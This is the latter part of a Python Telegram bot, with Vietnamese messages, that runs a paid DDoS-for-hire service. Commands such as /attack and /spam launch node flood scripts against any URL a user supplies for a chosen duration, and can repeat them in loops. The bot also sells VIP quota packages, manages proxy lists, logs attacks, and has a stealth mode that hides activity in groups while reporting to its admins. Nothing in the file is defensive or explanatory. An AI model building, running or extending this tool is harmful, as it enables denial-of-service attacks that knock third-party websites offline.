    task = asyncio.create_task(run_spam_loop(cmd, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private))
    looping_tasks[user_id] = {'task': task, 'target': url}

async def tat_spam(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    
    if get_stealth_mode() and not is_private:
        return
    
    if user_id not in looping_tasks:
        if not is_stealth or is_private:
            await update.message.reply_text("❌ Không có vòng lặp nào đang chạy!")
        return
    
    looping_tasks[user_id]['task'].cancel()
    del looping_tasks[user_id]
    
    if not is_stealth or is_private:
        await update.message.reply_text("✅ Đã tắt AUTO SPAM.")

async def run_spam_loop(command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private):
    loop_count = 1
    try:
        while True:
            if loop_count > 1 and not is_admin(user_id):
                vip_cfg = get_vip_config(user_id)
                if vip_cfg:
                    if vip_cfg['quota'] <= 0:
                        try: await context.bot.send_message(user_id, "❌ Hết quota! Dừng spam.", parse_mode='HTML')
                        except Exception: pass
                        if user_id in looping_tasks: del looping_tasks[user_id]
                        return
                    db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id))
                    await tele_backup_db(context)
                else:
                    left_quota = check_and_update_member_quota(user_id)
                    if left_quota == -1:
                        try: await context.bot.send_message(user_id, "❌ Hết lượt ngày! Dừng spam.", parse_mode='HTML')
                        except Exception: pass
                        if user_id in looping_tasks: del looping_tasks[user_id]
                        return
                
                log_attack(user_id, username, url, method_name, attack_time)

            process = await asyncio.create_subprocess_shell(command)
            await process.communicate()
            loop_count += 1
            await asyncio.sleep(get_user_cooldown(user_id))
            
    except asyncio.CancelledError: return

# --- PANEL: ATTACK DASHBOARD ---
async def tao_choi(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    
    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): 
        return await reply_error("❌ Hệ thống đang bảo trì!")
        
    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): 
        return await reply_error("🚫 Nhóm chưa được cấp phép.")
        
    vip_cfg = get_vip_config(user_id)
    is_u_vip = vip_cfg is not None

    if not is_admin(user_id):
        user_max_concurrent = vip_cfg['max_concurrent'] if is_u_vip else int(get_system_setting("member_max_concurrent", "3"))
        if get_running_tasks_count(user_id) >= user_max_concurrent:
            return await reply_error(f"⚠️ Đạt giới hạn luồng ({user_max_concurrent})!")

    if not is_admin(user_id):
        if user_id in looping_tasks: 
            return await reply_error("🔄 Đang ở chế độ Auto Spam!")
        if active_users.get(user_id, False): 
            return await reply_error("⏳ Đang có tiến trình chạy!")
        
        dynamic_cooldown = get_user_cooldown(user_id)
        time_passed = time.time() - user_cooldowns.get(user_id, 0)
        if time_passed < dynamic_cooldown: 
            return await reply_error(f"❄️ Đợi {int(dynamic_cooldown - time_passed)}s.")

    if len(context.args) < 2: 
        return await reply_error("⚠️ /attack [method] [url] [time]")

    method_name, url = context.args[0], context.args[1]
    methods_data = get_all_methods()
    if method_name not in methods_data: 
        return await reply_error("❌ Method không tồn tại!")
        
    method = methods_data[method_name]

    if method.get('visibility') == 'VIP' and not is_admin(user_id) and not is_u_vip:
        return await reply_error("🔒 Method này chỉ dành cho VIP! Nâng cấp để sử dụng.")

    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: 
        return await reply_error("🛡️ Mục tiêu trong Blacklist!")

    ip, isp_info = await lay_ip_va_isp(url)
    if not ip: 
        return await reply_error("🌐 Lỗi DNS!")

    attack_time = method['time']
    if len(context.args) > 2:
        try: attack_time = int(context.args[2])
        except ValueError: pass

    if not is_admin(user_id) and not is_u_vip:
        sys_global_max_time = int(get_system_setting("member_global_max_time", 60))
        if attack_time > sys_global_max_time: attack_time = sys_global_max_time
        left_quota = check_and_update_member_quota(user_id)
        if left_quota == -1: 
            return await reply_error("❌ Hết lượt trong ngày!")

    if not is_admin(user_id) and is_u_vip:
        if vip_cfg['quota'] <= 0: 
            return await reply_error("❌ Hết quota VIP!")
        if attack_time > vip_cfg['max_time']: 
            attack_time = vip_cfg['max_time']
        db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id))

    username = update.message.from_user.username or update.message.from_user.full_name
    log_attack(user_id, username, url, method_name, attack_time)

    dashboard = (
        "💥 LAUNCH THE ATTACK\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 {escape(username)}\n"
        f"🎯 {url}\n"
        f"🔥 {method_name.upper()}\n"
        f"⏱ {attack_time}s\n"
        f"🖥 IP: {ip}\n"
        f"📡 {escape(isp_info.get('isp', 'N/A'))}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕒 {get_thoi_gian_vn()}"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📊 Check Host", url=f"https://check-host.net/check-http?host={url}"),
        InlineKeyboardButton("🛑 Dừng", callback_data="pkill")
    ]])
    
    if is_stealth and not is_private:
        for admin in ORIGINAL_ADMINS:
            try: await context.bot.send_message(chat_id=admin, text="🕵️ [SHADOW] " + dashboard, parse_mode='HTML', reply_markup=kb)
            except Exception: pass
    else:
        await update.message.reply_text(dashboard, parse_mode='HTML', reply_markup=kb)
    
    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    active_users[user_id] = True          
    user_cooldowns[user_id] = time.time() 
    asyncio.create_task(thuc_hien_tan_cong(cmd, update, method_name, context, user_id, is_stealth, is_private))
    await tele_backup_db(context)

async def thuc_hien_tan_cong(command, update, method_name, context, user_id, is_stealth, is_private):
    try:
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        res = f"✅ Tiến trình hoàn tất: {method_name.upper()}"
    except Exception: res = "❌ Lỗi thực thi lệnh!"
    finally: active_users[user_id] = False     
        
    if is_stealth and not is_private:
        for admin in ORIGINAL_ADMINS:
            try: await context.bot.send_message(chat_id=admin, text=f"{res} (Từ ID: {user_id})", parse_mode='HTML')
            except Exception: pass
    else:
        try: await update.message.reply_text(res, parse_mode='HTML')
        except Exception: pass

# --- QUẢN TRỊ ADMIN ---
async def vps_stats(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    cpu = psutil.cpu_percent(interval=0.5)
    ram = psutil.virtual_memory().percent
    await update.message.reply_text(
        f"🖥 SERVER\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ CPU: {cpu}%\n"
        f"🧠 RAM: {ram}%",
        parse_mode='HTML'
    )

async def danh_sach_proxy(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    try:
        txt_files = [f for f in os.listdir('.') if os.path.isfile(f) and f.endswith('.txt')]
        
        if not txt_files:
            return await update.message.reply_text(
                "📭 Không tìm thấy file .txt nào!",
                parse_mode='HTML'
            )
        
        msg = "📂 DANH SÁCH PROXIES\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for file in txt_files:
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    line_count = sum(1 for line in f if line.strip())
                msg += f"📄 {file}: {line_count:,} proxies\n"
            except Exception:
                msg += f"📄 {file} - ❌ Lỗi đọc\n"
        
        await update.message.reply_text(msg, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ Lỗi: {str(e)}",
            parse_mode='HTML'
        )

async def tai_file_proxy(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    if len(context.args) < 1: 
        return await update.message.reply_text("⚠️ /dlproxies [tên_file.txt]", parse_mode='HTML')
    filename = context.args[0]
    if not filename.endswith('.txt'): filename += '.txt'
    if not os.path.exists(filename): 
        return await update.message.reply_text(f"❌ File {filename} không tồn tại!", parse_mode='HTML')
    try:
        with open(filename, 'rb') as doc:
            await context.bot.send_document(chat_id=update.effective_chat.id, document=doc, filename=filename, caption=f"💾 File proxies: {filename}")
    except Exception as e: 
        await update.message.reply_text(f"❌ Lỗi: {str(e)}", parse_mode='HTML')

async def quan_ly_admin(update, context, action):
    if update.message.from_user.id not in ORIGINAL_ADMINS: return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    try: target_id = int(context.args[0])
    except: return await update.message.reply_text("⚠️ /addadmin [id]", parse_mode='HTML')
    if action == "add":
        db_query('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (target_id,))
        await update.message.reply_text(f"👑 Đã cấp quyền Admin phụ cho ID: {target_id}", parse_mode='HTML')
    else:
        db_query('DELETE FROM admins WHERE user_id=?', (target_id,))
        await update.message.reply_text(f"❌ Đã gỡ quyền Admin của ID: {target_id}", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_chay_rieng(update, context, action):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    try: target_id = int(context.args[0])
    except: return await update.message.reply_text("⚠️ /allowprivate [id]", parse_mode='HTML')
    if action == "add":
        db_query('INSERT OR IGNORE INTO private_allowed (user_id) VALUES (?)', (target_id,))
        await update.message.reply_text(f"🔓 Đã cấp quyền chạy riêng cho ID: {target_id}", parse_mode='HTML')
    else:
        db_query('DELETE FROM private_allowed WHERE user_id=?', (target_id,))
        await update.message.reply_text(f"🔒 Đã thu hồi quyền chạy riêng của ID: {target_id}", parse_mode='HTML')
    await tele_backup_db(context)

async def xem_lich_su_tan_cong(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    rows = db_query('SELECT username, target, method, duration, time_at FROM attack_logs ORDER BY id DESC LIMIT 10', fetch=True)
    if not rows: 
        return await update.message.reply_text("📭 Chưa có lịch sử!", parse_mode='HTML')
    
    msg = "📜 LỊCH SỬ TẤN CÔNG\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for r in rows:
        msg += f"👤 {escape(r[0])}\n"
        msg += f"🎯 {escape(r[1])}\n"
        msg += f"⚡ {r[2].upper()} ({r[3]}s)\n"
        msg += f"🕒 {r[4]}\n"
        msg += "─────────────────────\n"
    await update.message.reply_text(msg, parse_mode='HTML')

async def xoa_lich_su_tan_cong(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    db_query('DELETE FROM attack_logs')
    await update.message.reply_text("🗑 Đã xóa sạch lịch sử!", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_he_thong_com(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    if len(context.args) < 4:
        curr_concurrent = get_system_setting("member_max_concurrent", "3")
        curr_max_time = get_system_setting("member_global_max_time", "60")
        curr_daily_limit = get_system_setting("member_daily_limit", "10")
        curr_ref_needed = get_system_setting("ref_needed_for_vip", "5")
        return await update.message.reply_text(
            f"⚙️ CẤU HÌNH MEMBER\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📶 Slot: {curr_concurrent}\n"
            f"⏱ Time: {curr_max_time}s\n"
            f"📅 Lượt/ngày: {curr_daily_limit}\n"
            f"👥 Ref mở VIP: {curr_ref_needed}\n\n"
            f"⚠️ /setsystem [slot] [time] [lượt] [ref]",
            parse_mode='HTML'
        )
    try:
        concurrent, max_time = int(context.args[0]), int(context.args[1])
        daily_limit, ref_needed = int(context.args[2]), int(context.args[3])
    except ValueError: 
        return await update.message.reply_text("⚠️ Tham số phải là số!", parse_mode='HTML')
        
    db_query('REPLACE INTO settings (key, value) VALUES ("member_max_concurrent", ?)', (str(concurrent),))
    db_query('REPLACE INTO settings (key, value) VALUES ("member_global_max_time", ?)', (str(max_time),))
    db_query('REPLACE INTO settings (key, value) VALUES ("member_daily_limit", ?)', (str(daily_limit),))
    db_query('REPLACE INTO settings (key, value) VALUES ("ref_needed_for_vip", ?)', (str(ref_needed),))
    await update.message.reply_text(f"✅ Đã cập nhật cấu hình Member!", parse_mode='HTML')
    await tele_backup_db(context)

async def thiet_lap_goi_vip(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    if len(context.args) < 7:
        return await update.message.reply_text("⚠️ /setpackage [tên_gói] [time] [quota] [spam:1/0] [schedule:1/0] [cooldown] [slot]", parse_mode='HTML')
    try:
        pkg_name = context.args[0].upper()
        m_time, quota, spam, sch, cd, mc = int(context.args[1]), int(context.args[2]), int(context.args[3]), int(context.args[4]), int(context.args[5]), int(context.args[6])
    except ValueError: 
        return await update.message.reply_text("⚠️ Tham số phải là số!", parse_mode='HTML')

    db_query('REPLACE INTO vip_packages VALUES (?, ?, ?, ?, ?, ?, ?)', (pkg_name, m_time, quota, spam, sch, cd, mc))
    await update.message.reply_text(f"✅ Đã thiết lập gói {pkg_name} thành công!", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_vip_user(update, context, action):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    if action == "add":
        if len(context.args) < 2: 
            return await update.message.reply_text("⚠️ /vipuser [tên_gói] [id]", parse_mode='HTML')
        pkg_name = context.args[0].upper()
        try: uid = int(context.args[1])
        except ValueError: 
            return await update.message.reply_text("⚠️ ID không hợp lệ!", parse_mode='HTML')

        pkg_check = db_query('SELECT package_name FROM vip_packages WHERE package_name=?', (pkg_name,), fetch=True)
        if not pkg_check: 
            return await update.message.reply_text(f"❌ Gói {pkg_name} không tồn tại!", parse_mode='HTML')

        db_query('REPLACE INTO vip_users (user_id, package_name) VALUES (?, ?)', (uid, pkg_name))
        await update.message.reply_text(f"👑 Đã kích hoạt gói {pkg_name} cho ID {uid}", parse_mode='HTML')
    else:
        try: uid = int(context.args[0])
        except ValueError: 
            return await update.message.reply_text("⚠️ ID không hợp lệ!", parse_mode='HTML')
        db_query('DELETE FROM vip_users WHERE user_id=?', (uid,))
        await update.message.reply_text(f"❌ Đã hủy quyền VIP của ID: {uid}", parse_mode='HTML')
    await tele_backup_db(context)

async def sua_rieng_vip_user(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    if len(context.args) < 3: 
        return await update.message.reply_text("⚠️ /editvip [id] [quota/time/cooldown/concurrent] [giá_trị]", parse_mode='HTML')
    try:
        uid = int(context.args[0])
        field = context.args[1].lower()
        val = int(context.args[2])
    except ValueError: 
        return await update.message.reply_text("⚠️ Thông số phải là số!", parse_mode='HTML')

    if not check_vip_status(uid): 
        return await update.message.reply_text("❌ ID này là người thường!", parse_mode='HTML')

    if field == "quota": db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id = ?', (val, uid))
    elif field == "time": db_query('UPDATE vip_users SET custom_max_time = ? WHERE user_id = ?', (val, uid))
    elif field == "cooldown": db_query('UPDATE vip_users SET custom_cooldown = ? WHERE user_id = ?', (val, uid))
    elif field == "concurrent": db_query('UPDATE vip_users SET custom_max_concurrent = ? WHERE user_id = ?', (val, uid))
    else: return await update.message.reply_text("❌ Thuộc tính sai!", parse_mode='HTML')

    await update.message.reply_text(f"✅ Đã đổi {field} của ID {uid} thành {val}!", parse_mode='HTML')
    await tele_backup_db(context)

async def stop_process(update, context):
    if not is_admin(update.effective_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    try:
        process = await asyncio.create_subprocess_shell("pkill -9 -f node")
        await process.communicate()
        active_users.clear()
        for t_id, t_info in scheduled_tasks.items(): t_info['task'].cancel()
        scheduled_tasks.clear()
        for u_id, sp_info in looping_tasks.items(): sp_info['task'].cancel()
        looping_tasks.clear()
    except Exception as e: print(e)
    
    text = "⏹ Đã dọn dẹp và hủy toàn bộ tiến trình!"
    if update.callback_query:
        await update.callback_query.answer("Đã dừng khẩn cấp!")
        await update.callback_query.message.reply_text(text, parse_mode='HTML')
    else: await update.message.reply_text(text, parse_mode='HTML')

async def bot_on(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    set_bot_state(True)
    await update.message.reply_text("✅ Hệ thống ONLINE.", parse_mode='HTML')

async def bot_off(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    set_bot_state(False)
    await update.message.reply_text("❌ Hệ thống OFFLINE.", parse_mode='HTML')

async def them_phuong_thuc(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    method_name, req_method, url = context.args[0], context.args[1].upper(), context.args[2]
    attack_time = 60
    if req_method not in ['GET', 'POST', 'NONE']: 
        return await update.message.reply_text("⚠️ Loại method phải là GET, POST hoặc NONE.", parse_mode='HTML')
    if 'timeset' in context.args:
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except ValueError: return await update.message.reply_text("🔥 Thời gian không hợp lệ.", parse_mode='HTML')
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    extra_args = [arg for arg in context.args[3:] if arg not in ['[vip]', '[member]', 'timeset']]
    cmd = f"node --max-old-space-size=65536 {method_name} {url} " + " ".join(extra_args) if req_method == 'NONE' else f"node --max-old-space-size=65536 {method_name} {req_method} {url} " + " ".join(extra_args)
    db_query('REPLACE INTO methods (name, type, url, time, visibility, command) VALUES (?, ?, ?, ?, ?, ?)', (method_name, req_method, url, attack_time, visibility, cmd))
    await update.message.reply_text(f"✅ Đã thêm method: {method_name}", parse_mode='HTML')
    await tele_backup_db(context)

async def xoa_phuong_thuc(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    db_query('DELETE FROM methods WHERE name=?', (context.args[0],))
    await update.message.reply_text(f"✅ Đã xóa method: {context.args[0]}", parse_mode='HTML')
    await tele_backup_db(context)

async def set_member_cooldown(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    try: seconds = int(context.args[0])
    except: return await update.message.reply_text("⚠️ /setcooldown [s]", parse_mode='HTML')
    db_query('REPLACE INTO settings (key, value) VALUES ("member_cooldown", ?)', (str(seconds),))
    await update.message.reply_text(f"⚙️ Thời gian nghỉ Member đổi thành {seconds}s.", parse_mode='HTML')
    await tele_backup_db(context)

async def them_nhom(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    try: gid = int(context.args[0])
    except: return await update.message.reply_text("⚠️ ID nhóm không hợp lệ.", parse_mode='HTML')
    db_query('INSERT OR IGNORE INTO groups_allowed (group_id) VALUES (?)', (gid,))
    await update.message.reply_text(f"✅ Đã cấp phép nhóm: {gid}", parse_mode='HTML')
    await tele_backup_db(context)

async def xoa_nhom(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    try: gid = int(context.args[0])
    except: return await update.message.reply_text("⚠️ ID nhóm không hợp lệ.", parse_mode='HTML')
    db_query('DELETE FROM groups_allowed WHERE group_id=?', (gid,))
    await update.message.reply_text(f"❌ Đã hủy phép nhóm: {gid}", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_blacklist(update, context, action):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    domain = context.args[0].lower()
    if action == "add":
        db_query('INSERT OR IGNORE INTO blacklist (domain) VALUES (?)', (domain,))
        await update.message.reply_text(f"✅ Đã đưa vào Blacklist: {domain}", parse_mode='HTML')
    else:
        db_query('DELETE FROM blacklist WHERE domain=?', (domain,))
        await update.message.reply_text(f"✅ Đã gỡ khỏi Blacklist: {domain}", parse_mode='HTML')
    await tele_backup_db(context)

# --- CHỦ ĐỘNG BACKUP DB ---
async def chu_dong_backup_db(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    await update.message.reply_text("📦 Đang đóng gói...", parse_mode='HTML')
    await tele_backup_db(context)

async def upload_db(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
    
    if update.message.document:
        if update.message.document.file_name == DB_FILE:
            file = await update.message.document.get_file()
            await file.download_to_drive(custom_path=DB_FILE)
            await update.message.reply_text("✅ Đã tiếp nhận cấu trúc dữ liệu mới!", parse_mode='HTML')
        else:
            await update.message.reply_text(f"❌ Sai tên tệp! Phải là {DB_FILE}", parse_mode='HTML')
    else:
        await update.message.reply_text("⚠️ Đính kèm file bot_database.db", parse_mode='HTML')

async def help_admin(update, context):
    if not is_admin(update.message.from_user.id): return
    is_private = update.message.chat.type == 'private'
    if get_stealth_mode() and not is_private: return
        
    msg = (
        "⚡️ ADMIN PANEL\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔧 HỆ THỐNG:\n"
        "▸ /on | /off\n"
        "▸ /botro - Chế độ ẩn\n"
        "▸ /pkill - Dừng\n"
        "▸ /vps - Server\n"
        "▸ /backup\n"
        "▸ /upload\n\n"
        "🔒 QUẢN LÝ:\n"
        "▸ /addadmin /deladmin\n"
        "▸ /allowprivate /delprivate\n"
        "▸ /logs /clearlogs\n"
        "▸ /proxies /dlproxies\n\n"
        "👑 VIP:\n"
        "▸ /setpackage\n"
        "▸ /vipuser /delvip\n"
        "▸ /editvip\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )
    
    await update.message.reply_text(msg, parse_mode='HTML')

def make_handler(func, min_args, help_text, *extra_args):
    async def wrapper(update, context):
        if len(context.args) < min_args: 
            return await update.message.reply_text(f"⚠️ Lỗi cú pháp: {help_text}", parse_mode='HTML')
        if extra_args: await func(update, context, *extra_args)
        else: await func(update, context)
    return wrapper

# --- HÀM MAIN ---
def main():
    init_db()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", help_group))
    app.add_handler(CommandHandler("help", help_group))
    app.add_handler(CommandHandler("me", thong_tin_vip)) 
    app.add_handler(CommandHandler("price", xem_gia_vip))
    app.add_handler(CommandHandler("check", check_website))
    app.add_handler(CommandHandler("methods", danh_sach_phuong_thuc))
    app.add_handler(CommandHandler("attack", tao_choi))
    app.add_handler(CommandHandler("spam", bat_spam))
    app.add_handler(CommandHandler("stopspam", tat_spam))
    app.add_handler(CommandHandler("schedule", dat_lich))
    app.add_handler(CommandHandler("delschedule", huy_lich))
    
    app.add_handler(CommandHandler("botro", toggle_botro))
    app.add_handler(CommandHandler("pkill", stop_process))
    app.add_handler(CallbackQueryHandler(stop_process, pattern="^pkill$"))
    app.add_handler(CommandHandler("on", bot_on))
    app.add_handler(CommandHandler("off", bot_off))
    app.add_handler(CommandHandler("vps", vps_stats))
    app.add_handler(CommandHandler("proxies", danh_sach_proxy))
    app.add_handler(CommandHandler("dlproxies", tai_file_proxy))
    app.add_handler(CommandHandler("setsystem", quan_ly_he_thong_com))
    app.add_handler(CommandHandler("setcooldown", set_member_cooldown))

    app.add_handler(CommandHandler("addadmin", make_handler(quan_ly_admin, 1, "/addadmin [id]", "add")))
    app.add_handler(CommandHandler("deladmin", make_handler(quan_ly_admin, 1, "/deladmin [id]", "remove")))
    app.add_handler(CommandHandler("allowprivate", make_handler(quan_ly_chay_rieng, 1, "/allowprivate [id]", "add")))
    app.add_handler(CommandHandler("delprivate", make_handler(quan_ly_chay_rieng, 1, "/delprivate [id]", "remove")))
    app.add_handler(CommandHandler("logs", xem_lich_su_tan_cong))
    app.add_handler(CommandHandler("clearlogs", xoa_lich_su_tan_cong))
    
    app.add_handler(CommandHandler("setpackage", thiet_lap_goi_vip))
    app.add_handler(CommandHandler("editvip", sua_rieng_vip_user))
    app.add_handler(CommandHandler("backup", chu_dong_backup_db))
    
    app.add_handler(CommandHandler("upload", upload_db))
    app.add_handler(MessageHandler(filters.Document.ALL, upload_db))

    app.add_handler(CommandHandler("helpadmin", help_admin))
    app.add_handler(CommandHandler("add", make_handler(them_phuong_thuc, 3, "/add [name] [GET/POST/NONE] [url] ...")))
    app.add_handler(CommandHandler("del", make_handler(xoa_phuong_thuc, 1, "/del [name]")))
    app.add_handler(CommandHandler("vipuser", make_handler(quan_ly_vip_user, 2, "/vipuser [tên_gói] [id]", "add")))
    app.add_handler(CommandHandler("delvip", make_handler(quan_ly_vip_user, 1, "/delvip [id]", "remove")))
    app.add_handler(CommandHandler("addgroup", make_handler(them_nhom, 1, "/addgroup [id]")))
    app.add_handler(CommandHandler("delgroup", make_handler(xoa_nhom, 1, "/delgroup [id]")))
    app.add_handler(CommandHandler("addblacklist", make_handler(quan_ly_blacklist, 1, "/addblacklist [domain]", "add")))
    app.add_handler(CommandHandler("delblacklist", make_handler(quan_ly_blacklist, 1, "/delblacklist [domain]", "remove")))
    
    print("🚀 Bot ZenTra Víp Pro!")
    app.run_polling()

if __name__ == "__main__": main()
